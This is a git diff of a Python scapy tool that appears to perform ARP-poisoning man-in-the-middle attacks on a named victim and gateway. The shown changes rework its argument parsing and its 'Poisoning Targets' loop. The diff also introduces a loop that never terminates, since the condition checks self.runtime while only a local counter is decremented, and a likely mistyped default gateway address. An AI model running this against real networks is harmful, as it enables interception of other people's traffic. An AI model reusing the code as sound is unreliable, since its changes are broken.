@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+
 """
  Copyright (c) 2017, Syslog777
 
@@ -31,8 +31,8 @@
 from scapy.all import *
 
 """
-Argments:
---mitm: module to load and total runtime in seconds
+All arguments:
+--mitm: total runtime in seconds
 -iface: Interface to use for network activity
 -vIP: IP of the victim
 -gIP: IP of the gate/ node that the victim
@@ -42,14 +42,25 @@ Argments:
 
 class Mitm:
 
-    def __init__(self, mitm_args):
+    def __init__(self, parser):
+        parser.add_argument('runtime', nargs="?", help="Mitm time to run")
+        parser.add_argument('-iface', '--interface', dest="interface",
+                            required=True, type=str,
+                            help="interface to use for network activity")
+        parser.add_argument('-vIP', '--victim-ip', help="IP of the victim",
+                            dest="victim_ip", required=True, type=str,
+                            default="127.0.0.1")
+        parser.add_argument('-gIP', '--gate-ip', dest="gate_ip", required=True, type=str,
+                            default="196.168.2.1",
+                            help="IP of the gate/ node that the victim is connecting to")
         self.enable_forwarding()
-        self.interface = mitm_args.get_interface()
-        self.victim_ip = mitm_args.get_victim_ip()
-        self.gate_ip = mitm_args.get_gate_ip()
+        self.args = parser.parse_args()
+        self.interface = self.args.interface
+        self.victim_ip = self.args.victim_ip
+        self.gate_ip = self.args.gate_ip
         self.victim_mac = self.get_mac(self.victim_ip)
         self.gate_mac = self.get_mac(self.gate_ip)
-        self.runtime = mitm_args.get_runtime()
+        self.runtime = self.args.runtime
 
     def enable_forwarding(self):
         print("\n[*] Enabling IP forwarding....\n")
@@ -93,7 +104,7 @@ class Mitm:
         self.re_arp()
         self.disable_forwarding()
 
-    def connect(self, runtime=10):
+    def connect(self, runtime=1):
         """
         connection_attempts: total number of attempts to trick the victim
         and the gate
@@ -110,7 +121,7 @@ class Mitm:
             print("[!] Couldn't Find Gateway MAC Address")
             self.mitm_shutdown()
         print("[*] Poisoning Targets...")
-        while runtime > 0:
+        while self.runtime > 0:
             try:
                 self.trick(self.gate_mac, self.victim_mac)
                 runtime = runtime - 1
